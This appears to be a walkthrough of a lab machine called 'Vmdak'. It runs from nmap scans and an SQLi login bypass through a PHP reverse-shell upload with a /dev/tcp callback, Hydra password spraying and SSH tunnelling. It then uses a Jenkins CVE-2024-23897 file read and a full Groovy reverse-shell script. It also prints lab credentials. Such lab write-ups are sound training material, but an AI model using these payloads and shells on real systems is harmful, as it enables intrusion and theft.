nmap scan
```sh
nmap -p- --min-rate 5000 -T4 -Pn 192.168.117.103                                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 11:42 IST
Warning: 192.168.117.103 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.117.103
Host is up (0.096s latency).
Not shown: 65457 closed tcp ports (reset), 74 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
9443/tcp open  tungsten-https

Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
```

```sh
nmap -sC -sV -T4 -Pn -p 21,22,80,9443 192.168.117.103                                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 11:42 IST
Nmap scan report for 192.168.117.103
Host is up (1.3s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.163
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            1752 Sep 19  2024 config.xml
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:18:f1:19:6b:29:db:da:3d:f6:7b:ab:f4:b5:63:e0 (ECDSA)
|_  256 cb:d8:d6:ef:82:77:8a:25:32:08:dd:91:96:8d:ab:7d (ED25519)
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
9443/tcp open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title:  Home - Prison Management System
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=vmdak.local/organizationName=PrisonManagement/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:vmdak.local
| Not valid before: 2024-08-20T09:21:33
|_Not valid after:  2025-08-20T09:21:33
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.73 seconds
```

Visiting web server on port 80. It's just a default Apache page, we can leave it for later if we can’t find anything else.
![](Vmdak1.png)
We can first explore the FTP server on port 21 since the NMAP scan deduced that we are allowed to login anonymously.
![](Vmdak2.png)
Once we transfer it back to our Kali machine and examine it, we find a field that stores the path to the root password of a Jenkins system.
![](Vmdak3.png)
We keep the above in mind for now and proceed with enumeration of the web services. Since port 80 is just a default Apache page, we can leave it for later if we can’t find anything else. We can explore port 9443 instead, which hosts a website over HTTPS.
![](Vmdak4.png)
In the top right corner, there is an “Admin Dashboard” button that takes us to a login page.
![](Vmdak5.png)

Default credentials like admin:admin don’t work. However, when we try to perform SQLi (e.g. entering a single apostrophe and signing in), we don’t get the usual “wrong password” alert. We are instead brought to a blank screen. This might mean there could be some SQLi vulnerability.

We can also verify this by searching up “Fast5 Prison Management System” online. We see that there is indeed a SQLi Authentication Bypass we can exploit https://www.exploit-db.com/exploits/52017
We simply fill in the login form with the following payload:
```
username : admin' or '1'='1 
password : 123456
```
![](Vmdak6.png)
Once we sign in, we see that we are now in the admin dashboard.
![](Vmdak7.png)

With administrative access, I began enumerating the dashboard for potential methods to execute code. The application has a **“User Management”** feature that includes an option to **“Edit Photo”**.
![](Vmdak8.png)
This feature allows users to upload avatars. I suspected it might be vulnerable to unrestricted file upload, which could lead to Remote Code Execution (RCE). I created a malicious PHP file containing a bash reverse shell payload:
### This payload didn't work so we used penetstmonkey php reverse shell. For rest follow the same process as mentioned below.
```sh
echo '<?php system("/bin/sh -i >& /dev/tcp/192.168.45.240/4444 0>&1"); ?>' > test.php
```
![](Vmdak9.png)

I uploaded the png file successfully and before uploading I started nc but didn't receivee shell.
![](Vmdak10.png)
![](Vmdak11.png)
![](Vmdak12.png)

Since the website only allows for image files to be uploaded, we first rename our shell to “shell.png”, which allows it to be uploaded. We then capture the traffic using Burpsuite and rename the file extension back to “.php”. Once we do this, we forward the traffic, and the PHP file should be successfully uploaded.
![](Vmdak13.png)
![](Vmdak14.png)
This simple modification tricks the server into accepting the PHP script as a valid image file.
Before forwarding the modified request, I started a Netcat listener on port 4444.
Once the upload was completed, I navigated to the location of the uploaded file (or the application automatically rendered it), triggering the execution of my PHP payload. 
**Then on the admin dashboard, we right click on the user’s profile picture and open the image in a new tab.**
I successfully received the shell.
![](Vmdak15.png)
Our current user is extremely low-privileged, and we can’t even read local.txt. As such, we have to find ways to escalate our current privileges and switch to a different user.

From linpeas, we find that the current user doesn’t have any sudo permissions and doesn’t belong to any special groups. We also see that there are no suspicious files with the SUID bit flipped, or any cronjobs that we can make use of. When such a scenario occurs, we continue with enumeration to see if there are any clues that we can work with.
![](Vmdak16.png)
Next, I explored the web application directories to look for configuration files or sensitive data. I navigated to `/var/www/prison/` and found a `database` directory.
![](Vmdak17.png)
By enumerating the files that we have access to within the /var/www/ directory, we find a file /var/www/prison/database/connect.php that stores a set of credentials root:sqlCr3ds3xp0seD for a MySQL database.
We can connect to this SQL database locally using the shell we have on the target machine.
```sh
mysql -u root -p
# password : sqlCr3ds3xp0seD
```

![](Vmdak18.png)
Now, we can start enumerating the database.
![](Vmdak20.png)
![](Vmdak21.png)
We eventually find some passwords that we might be able to use.
![](Vmdak22.png)
From these two tables, we can obtain the passwords `escobar2012` and `RonnyCache001`.

After we gather usernames from /etc/passwd, we can begin password spraying.
![](Vmdak23.png)

![](Vmdak24.png)
```sh
hydra -L users.txt -P pass.txt 192.168.108.103 ssh
```
![](Vmdak25.png)
So now we can login as the user vmdak via SSH and obtain local.txt from /home/vmdak.
![](Vmdak26.png)

### Privilege Escalation
Our vmdak user also doesn’t belong to any special groups, nor do they have permissions to write into root files. As such, we can continue with enumeration. We can examine if there are any internal ports running.
![](Vmdak27.png)
To access this internal service, I set up a local SSH tunnel using the credentials I found earlier (`vmdak:RonnyCache001`). This forwards local port 8080 on my attacking machine to port 8080 on the target machine.
```sh
ssh -L 8080:127.0.0.1:8080 vmdak@192.168.108.103
```

![](Vmdak28.png)
Now we can access the web service by navigating to http://127.0.0.1:8082. It leads us to an administrator login page for Jenkins. We are provided with a hint that an admin password might be located at /root/.jenkins/secrets/initialAdminPassword.
![](Vmdak29.png)
I recalled that during the initial FTP enumeration, I retrieved a `config.xml` file which disclosed the Jenkins version.
`<version>2.401.2</version>`

I searched for vulnerabilities affecting Jenkins 2.401.2 and discovered that this version is susceptible to [CVE-2024-23897 - Local File Inclusion](https://www.exploit-db.com/exploits/51993).

This critical vulnerability allows unauthenticated attackers to read arbitrary files on the Jenkins controller file system by manipulating the CLI command parser. This flaw effectively grants us the ability to read sensitive files, such as the initial admin password or SSH keys, without needing to authenticate first.

To exploit this vulnerability, I utilized a Python script (Exploit-DB 51993) designed to target **CVE-2024-23897**. Since I had already established an SSH tunnel, I pointed the exploit at the local Jenkins instance on `http://127.0.0.1:8080`.

We need to find password for `/root/.jenkins/secrets/initialAdminPassword` using the LFI.
![](Vmdak30.png)
![](Vmdak31.png)
Using the retrieved password (`140ef31373034d19a77baa9c6b84a200`), I successfully logged into the Jenkins web interface via the SSH tunnel (`http://127.0.0.1:8080`).
![](Vmdak32.png)
![](Vmdak33.png)

We find that we can abuse the script console on Jenkins to obtain a reverse shell (source: [https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)). 

![](Vmdak34.png)
For groovy reverse shell https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
![](Vmdak35.png)
**Reverse shell. Make 2 changes IP and cmd=bash as we want bash reverse shell.**
```sh
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
![](Vmdak36.png)
Started nc on port 8044.
![](Vmdak37.png)
